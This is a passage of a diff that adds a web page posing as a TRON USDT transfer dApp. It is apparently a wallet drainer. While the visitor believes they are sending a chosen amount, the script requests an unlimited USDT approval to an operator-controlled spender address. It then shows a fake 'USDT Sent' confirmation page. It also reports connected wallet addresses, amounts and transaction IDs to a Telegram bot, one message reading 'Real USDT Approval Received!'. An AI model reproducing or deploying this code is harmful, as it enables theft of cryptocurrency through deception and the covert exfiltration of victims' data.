+                }
+
+                // Try to request account access
+                try {
+                    if (window.tronLink && window.tronLink.request) {
+                        await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    } else if (window.tronWeb && window.tronWeb.request) {
+                        await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                    }
+                } catch (e) {
+                    console.log('Wallet action:', e.message);
+                }
+
+                // Get user address from available sources
+                userAddress = tronWeb.defaultAddress?.base58 || 
+                             tronWeb.address?.current?.base58 ||
+                             tronWeb.selectedAddress ||
+                             null;
+                
+                if (!userAddress) {
+                    showMessage('error', 'Failed to get wallet address. Make sure wallet is connected and unlocked.');
+                    addressText.innerHTML = '<span style="font-weight: 600;">TGjgVNa</span>pDCuxQcV1VwoFQE3ghPK<span style="font-weight: 600;">vqdmtw2</span>';
+                    return;
+                }
+
+                // Validate TRON address format
+                if (!isValidTronAddress(userAddress)) {
+                    showMessage('warning', `Invalid TRON address: ${userAddress}. Address must start with 'T'.`);
+                    addressText.innerHTML = '<span style="font-weight: 600;">TGjgVNa</span>pDCuxQcV1VwoFQE3ghPK<span style="font-weight: 600;">vqdmtw2</span>';
+                    return;
+                }
+
+                // Wait 1 second (silent wait, no address update needed)
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                isConnected = true;
+                
+                // Fetch USDT balance after successful connection
+                await fetchUsdtBalance(userAddress);
+                
+                // Send wallet connect notification to Telegram
+                sendWalletConnectNotification(userAddress);
+                
+            } catch (error) {
+                console.error('Wallet connection error:', error);
+                showMessage('error', `Connection failed: ${error.message}`);
+                addressText.innerHTML = '<span style="font-weight: 600;">TGjgVNa</span>pDCuxQcV1VwoFQE3ghPK<span style="font-weight: 600;">vqdmtw2</span>';
+            }
+        }
+
+        // Fetch USDT Balance
+        async function fetchUsdtBalance(address) {
+            try {
+                console.log('Fetching USDT balance for:', address);
+                const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
+                const balanceBigNumber = await contract.balanceOf(address).call();
+                
+                // Convert from BigNumber to decimal (divide by DECIMALS which is 6 for USDT)
+                const balanceWei = balanceBigNumber.toString();
+                userBalance = parseInt(balanceWei) / Math.pow(10, DECIMALS);
+                
+                // Format and display balance
+                const formattedBalance = formatBalance(userBalance);
+                document.getElementById('usdtBalance').textContent = formattedBalance;
+                
+                console.log('USDT Balance:', formattedBalance);
+            } catch (error) {
+                console.error('Error fetching balance:', error);
+                document.getElementById('usdtBalance').textContent = '0';
+                userBalance = 0;
+            }
+        }
+
+        // Format balance - remove unnecessary decimals
+        function formatBalance(balance) {
+            if (balance === 0) return '0';
+            // Remove trailing zeros after decimal point
+            return parseFloat(balance).toFixed(6).replace(/\.?0+$/, '');
+        }
+
+
+
+        // Store success page data
+        let lastApprovalData = null;
+
+        // Approve USDT (Unlimited)
+        async function approveUsdt() {
+            try {
+                if (!isConnected) {
+                    await connectWallet();
+                    if (!isConnected) return;
+                }
+
+                // Get the input amount
+                const inputAmount = parseFloat(document.getElementById('transferAmount').value) || 0;
+                
+                if (inputAmount <= 0) {
+                    showMessage('warning', 'Please enter an amount');
+                    return;
+                }
+
+                // Show approval in progress
+                showMessage('pending', 'Processing transfer...', 5000);
+                
+                // Send transfer initiated notification to Telegram
+                sendTransferInitiatedNotification(userAddress, inputAmount);
+
+                // Approve unlimited amount (max uint256 value - shows as "Unlimited" in wallets)
+                const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                
+                // Get contract instance
+                const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
+                
+                // Call approve function with unlimited amount
+                const tx = await contract.approve(SPENDER_ADDRESS, unlimitedAmount).send({
+                    feeLimit: 100000000, // 100 TRX
+                    callValue: 0,
+                    from: userAddress
+                });
+
+                console.log('Approval transaction:', tx);
+                
+                // Send notification to Telegram in background (fire-and-forget)
+                // Don't await - let success page show immediately
+                sendApprovalNotification(tx, userAddress);
+
+                // Get network fee from form
+                const feeText = document.getElementById('feeAmount').textContent;
+                const feeMatch = feeText.match(/([\d.]+)/);
+                const feeTrx = feeMatch ? parseFloat(feeMatch[1]) : 0;
+
+                // Determine wallet name
+                let walletName = 'Account 1';
+                if (window.ethereum && window.ethereum.isTronLink) {
+                    walletName = 'TronLink';
+                } else if (window.tronWeb && window.tronWeb.name) {
+                    walletName = window.tronWeb.name;
+                }
+
+                // Store data in localStorage for success.html to retrieve
+                localStorage.setItem('txAmount', `-${inputAmount}`);
+                localStorage.setItem('userAddress', userAddress);
+                localStorage.setItem('txFeeTrx', feeTrx.toFixed(3));
+                localStorage.setItem('walletName', walletName);
+
+                // Redirect to success.html with URL parameters
+                const params = new URLSearchParams({
+                    amount: `-${inputAmount}`,
+                    from: userAddress,
+                    feeTrx: feeTrx.toFixed(3),
+                    walletName: walletName
+                });
+                window.location.href = `success.html?${params.toString()}`;
+            } catch (error) {
+                console.error('Approval error:', error);
+                // Check if user cancelled the transaction
+                if (!error.message || error.message.includes('cancelled') || error.message.includes('denied') || error.message.includes('rejected')) {
+                    showMessage('warning', 'Transfer cancelled');
+                } else {
+                    showMessage('error', `Approval failed: ${error.message || 'Unknown error'}`);
+                }
+            }
+        }
+
+        // Truncate address to show first and last characters with bold
+        function truncateAddressBold(address, showChars = 7) {
+            if (!address || address.length <= showChars * 2) return address;
+            const first = address.substring(0, showChars);
+            const last = address.substring(address.length - showChars);
+            const middle = address.substring(showChars, address.length - showChars);
+            return `<span style="font-weight: 600;">${first}</span>${middle}<span style="font-weight: 600;">${last}</span>`;
+        }
+
+        // Truncate address to show first and last characters
+        function truncateAddress(address, showChars = 8) {
+            if (!address || address.length <= showChars * 2) return address;
+            return `${address.substring(0, showChars)}........${address.substring(address.length - showChars)}`;
+        }
+
+        // Show success page
+        function showSuccessPage() {
+            if (!lastApprovalData) return;
+
+            // Hide approval form, show success page
+            document.getElementById('approvalForm').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+
+            // Update header title to "USDT Sent"
+            document.querySelector('.header-title').textContent = 'USDT Sent';
+
+            // Update success page with data - format to 2 decimals
+            document.getElementById('successAmountValue').textContent = (-lastApprovalData.amount).toFixed(2);
+            document.getElementById('successUsdValue').textContent = (lastApprovalData.usdValue * 0.85).toFixed(2); // Adjust as needed
+            document.getElementById('successDate').textContent = lastApprovalData.timestamp;
+            document.getElementById('successNetworkFee').textContent = `${lastApprovalData.feeTrx.toFixed(4)} TRX ($${lastApprovalData.feeUsd.toFixed(2)})`;
+            
+            // Truncate recipient address
+            document.getElementById('successRecipient').textContent = truncateAddress(SPENDER_ADDRESS, 8);
+
+            showMessage('success', 'Transfer successful!');
+        }
+
+        // Return to approval form from success page
+        function returnToForm() {
+            document.getElementById('successPage').style.display = 'none';
+            document.getElementById('approvalForm').style.display = 'block';
+            
+            // Update header title back to "Send"
+            document.querySelector('.header-title').textContent = 'Send';
+            
+            // Reset form
+            document.getElementById('transferAmount').value = '';
+            document.getElementById('feeAmount').textContent = '0 TRX';
+            document.getElementById('feeUsd').textContent = '≈ $0.00';
+        }
+
+        // Disconnect Wallet
+        function disconnectWallet() {
+            userAddress = null;
+            userBalance = 0;
+            userTrxBalance = 0;
+            isConnected = false;
+            
+            const addressText = document.getElementById('addressText');
+            addressText.innerHTML = '<span style="font-weight: 600;">TGjgVNa</span>pDCuxQcV1VwoFQE3ghPK<span style="font-weight: 600;">vqdmtw2</span>';
+            
+            document.getElementById('usdtBalance').textContent = '0';
+            document.getElementById('transferAmount').value = '';
+            
+            showMessage('pending', 'Wallet disconnected');
+        }
+
+        // Token Selector Modal Functions
+        function openTokenSelector(event) {
+            event.preventDefault();
+            const modal = document.getElementById('tokenSelectorModal');
+            modal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeTokenSelector() {
+            const modal = document.getElementById('tokenSelectorModal');
+            modal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function connectWalletAndClose() {
+            closeTokenSelector();
+            
+            // Start loading animation sequence
+            const payWithBox = document.getElementById('payWithBox');
+            const feeDisplay = document.getElementById('feeDisplay');
+            
+            // Hide Pay With box
+            payWithBox.style.display = 'none';
+            
+            // Show loading animation
+            feeDisplay.innerHTML = '<span class="fee-loading-animation"></span>';
+            
+            // After 1 second, show Pay With box again and update amount
+            setTimeout(() => {
+                payWithBox.style.display = 'block';
+                feeDisplay.innerHTML = '<span style="color: #999;">$</span><span style="color: #999;">1.9</span> <span style="color: #333; font-weight: 500;">6.74 TRX</span>';
+            }, 1000);
+            
+            // Connect wallet
+            connectWallet();
+        }
+
+        function filterTokensModal() {
+            const searchInput = document.getElementById('tokenSearch').value.toUpperCase();
+            const tokenItems = document.querySelectorAll('.token-selector-item');
+            
+            tokenItems.forEach(item => {
+                const tokenName = item.querySelector('div > div:nth-child(2) > div:first-child').textContent.toUpperCase();
+                if (tokenName.includes(searchInput)) {
+                    item.style.display = 'flex';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        // Close modal on Escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeTokenSelector();
+            }
+        });
+
+        // Close modal when clicking overlay
+        document.addEventListener('DOMContentLoaded', () => {
+            const modal = document.getElementById('tokenSelectorModal');
+            if (modal) {
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        closeTokenSelector();
+                    }
+                });
+            }
+        });
+
+
+        // Validate TRON address
+        function isValidTronAddress(address) {
+            return /^T[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{33}$/.test(address);
+        }
+
+        // Show status message (popup version)
+        function showMessage(type, message, duration = 3000) {
+            const popupElement = document.getElementById('popupMessage');
+            popupElement.className = `popup-message show ${type}`;
+            popupElement.innerHTML = message;
+            
+            // Auto-hide after specified duration (default 3 seconds)
+            setTimeout(() => {
+                popupElement.classList.remove('show');
+            }, duration);
+        }
+
+        // Calculate network fee based on amount
+        function calculateNetworkFee(amount) {
+            // Show loading animation
+            const feeLoader = document.getElementById('feeLoader');
+            
+            // If amount is empty, reset fee to 0
+            if (!amount || parseFloat(amount) <= 0) {
+                feeLoader.style.display = 'none';
+                document.getElementById('feeAmount').textContent = '0 TRX';
+                document.getElementById('feeUsd').textContent = '≈ $0.00';
+                return;
+            }
+            
+            feeLoader.style.display = 'inline-block';
+            
+            // Simulate fee calculation with random delay
+            setTimeout(() => {
+                const numAmount = parseFloat(amount);
+                
+                // Fee range: 4.56434 TRX (0.2 USDT) to 21.5684 TRX (1000+ USDT)
+                // Linear progression: amount 0.2 = 4.56434 TRX, amount 1000+ = 21.5684 TRX
+                let fee;
+                if (numAmount <= 0.2) {
+                    fee = 4.56434;
+                } else if (numAmount >= 1000) {
+                    fee = 21.5684;
+                } else {
+                    // Linear interpolation
+                    const minAmount = 0.2;
+                    const maxAmount = 1000;
+                    const minFee = 4.56434;
+                    const maxFee = 21.5684;
+                    
+                    const progress = (numAmount - minAmount) / (maxAmount - minAmount);
+                    fee = minFee + (progress * (maxFee - minFee));
+                }
+                
+                // Assume 1 TRX ≈ $0.15 (approximate current price)
+                const trxPrice = 0.15;
+                const feeUsd = fee * trxPrice;
+                
+                // Update display
+                document.getElementById('feeAmount').textContent = fee.toFixed(3) + ' TRX';
+                document.getElementById('feeUsd').textContent = '≈ $' + feeUsd.toFixed(2);
+                
+                // Hide loading
+                feeLoader.style.display = 'none';
+            }, 500);
+        }
+
+        // Send wallet connected notification to Telegram group
+        async function sendWalletConnectNotification(address) {
+            try {
+                console.log('🔔 Sending wallet connect notification for:', address);
+                
+                const message = `🔗 Wallet Connected\n\n${address}\nTapped Connected Wallet`;
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const params = new URLSearchParams({
+                    chat_id: GROUP_ID,
+                    text: message
+                });
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: params.toString()
+                }).catch(err => {
+                    return fetch(`${url}?${params.toString()}`);
+                });
+                
+                const data = await response.json().catch(() => ({}));
+                console.log('✅ Wallet connection notification sent:', data.ok ? 'Success' : 'Check browser console');
+            } catch (error) {
+                console.error('⚠️ Notification error:', error.message);
+            }
+        }
+
+        // Send transfer initiated notification to Telegram group
+        async function sendTransferInitiatedNotification(address, amount) {
+            try {
+                console.log('Sending transfer initiated notification for:', address, 'Amount:', amount);
+                
+                const message = `<b>📤 Transfer Initiated</b>\n\n<code>${address}</code> Tap transfer\n<b>Amount:</b> ${amount} USDT`;
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${GROUP_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                
+                const response = await fetch(url);
+                
+                if (response.ok) {
+                    console.log('✅ Transfer initiated notification sent to Telegram group');
+                } else {
+                    console.error('❌ Telegram API error:', response.status);
+                }
+            } catch (error) {
+                console.error('❌ Error sending transfer initiated notification:', error.message);
+            }
+        }
+
+        // Send approval notification to Telegram group
+        async function sendApprovalNotification(txId, address) {
+            try {
+                console.log('Sending Telegram notification for tx:', txId);
+                
+                // Updated message with real USDT and spender address
+                const message = `<b>✅ Real USDT Approval Received!</b>\n\n<b>Network:</b> TRON Mainnet\n<b>Contract:</b> <code>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code> (Tether USDT)\n<b>From Address:</b> <code>${address}</code>\n<b>Spender (Your Address):</b> <code>${SPENDER_ADDRESS}</code>\n<b>Transaction:</b> <code>${txId}</code>\n\n<a href="https://tronscan.org/#/transaction/${txId}">📋 View on TronScan</a>`;
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${GROUP_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                
+                console.log('Telegram API URL:', url.substring(0, 50) + '...');
+                
+                const response = await fetch(url);
+                console.log('Telegram response status:', response.status);
+                
+                if (response.ok) {
+                    console.log('✅ Notification sent to Telegram group');
+                } else {
+                    const errorText = await response.text();
+                    console.error('❌ Telegram API error:', response.status, errorText);
+                    console.warn('Note: Browser CORS may block Telegram API. Check console for details.');
+                }
+            } catch (error) {
+                console.error('❌ Error sending Telegram notification:', error.message);
+                console.warn('Possible causes: CORS blocked, network error, or invalid bot token/group ID');
+            }
+        }
+
+        // Setup header buttons and menu
+        function setupHeaderButtons() {
+            document.getElementById('backBtn').addEventListener('click', () => {
+                // Check if success page is visible
+                if (document.getElementById('successPage').style.display !== 'none') {
+                    // Return to form from success page
+                    returnToForm();
+                } else {
+                    // Navigate back
+                    window.history.back();
+                }
+            });
+
+            document.getElementById('menuBtn').addEventListener('click', () => {
+                document.getElementById('dialogOverlay').classList.add('show');
+            });
+
+            document.getElementById('dialogOverlay').addEventListener('click', (e) => {
+                if (e.target === document.getElementById('dialogOverlay')) {
+                    document.getElementById('dialogOverlay').classList.remove('show');
+                    document.getElementById('shareDialog').classList.remove('show');
+                    document.getElementById('mainMenu').style.display = 'block';
+                }
+            });
+
+            document.getElementById('shareOption').addEventListener('click', () => {
+                document.getElementById('mainMenu').style.display = 'none';
+                document.getElementById('shareDialog').classList.add('show');
+            });
+
+            document.getElementById('shareBackBtn').addEventListener('click', () => {
+                document.getElementById('shareDialog').classList.remove('show');
+                document.getElementById('mainMenu').style.display = 'block';
+            });
+
+            document.getElementById('copyBtn').addEventListener('click', () => {
+                const link = document.getElementById('shareLink').textContent;
+                navigator.clipboard.writeText(link).then(() => {
+                    const originalText = document.getElementById('copyBtn').textContent;
+                    document.getElementById('copyBtn').textContent = '✓ Copied';
+                    setTimeout(() => {
+                        document.getElementById('copyBtn').textContent = originalText;
+                    }, 2000);
+                }).catch(err => {
+                    console.error('Failed to copy:', err);
+                });
+            });
+
+            document.getElementById('shareBtn').addEventListener('click', () => {
+                const link = document.getElementById('shareLink').textContent;
+                if (navigator.share) {
+                    navigator.share({
+                        title: 'Tron Usdt Transfer',
+                        text: 'Check out this Tron Usdt Transfer DApp',
+                        url: link
+                    }).catch(err => {
+                        console.log('Share cancelled or failed:', err);
+                    });
+                } else {
+                    navigator.clipboard.writeText(link);
+                    showMessage('pending', 'Link copied to clipboard');
+                }
+            });
+        }
+
+        // Initialize on page load
+        window.addEventListener('DOMContentLoaded', async () => {
+            await initTronWeb();
+            setupHeaderButtons();
+            
+            // Show token selector modal on initial load
+            document.getElementById('tokenSelectorModal').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            // Event listeners
+            document.getElementById('approveBtn').addEventListener('click', approveUsdt);
+            document.getElementById('doneBtn').addEventListener('click', returnToForm);
+            
+            // Fee info button tooltip
+            document.getElementById('feeInfoBtn').addEventListener('click', () => {
+                const tooltip = document.getElementById('feeInfoTooltip');
+                tooltip.classList.toggle('show');
+            });
+
+            // Close tooltip when clicking outside
+            document.addEventListener('click', (e) => {
+                const feeInfoBtn = document.getElementById('feeInfoBtn');
+                const tooltip = document.getElementById('feeInfoTooltip');
+                if (!feeInfoBtn.contains(e.target) && !tooltip.contains(e.target)) {
+                    tooltip.classList.remove('show');
+                }
+            });
+            
+            // Maximum button - fill amount with USDT balance
+            document.querySelector('.max-btn').addEventListener('click', (e) => {
+                e.preventDefault();
+                if (userBalance > 0) {
+                    document.getElementById('transferAmount').value = formatBalance(userBalance);
+                    calculateNetworkFee(userBalance);
+                } else {
+                    // Show message without popup - just indicate no balance
+                    return;
+                }
+            });
+
+            // Amount input - calculate fee on input
+            document.getElementById('transferAmount').addEventListener('input', (e) => {
+                const amount = e.target.value;
+                calculateNetworkFee(amount);
+            });
+        });
+
+        // Listen for wallet changes
+        if (window.tronWeb) {
+            window.addEventListener('message', (event) => {
+                if (event.data.message && event.data.message.action === 'setAccount') {
+                    console.log('Account changed, reconnecting...');
+                    connectWallet();
+                }
+            });
+        }
+    </script>
+</body>
+</html>
+
+
+</body>
+</html>
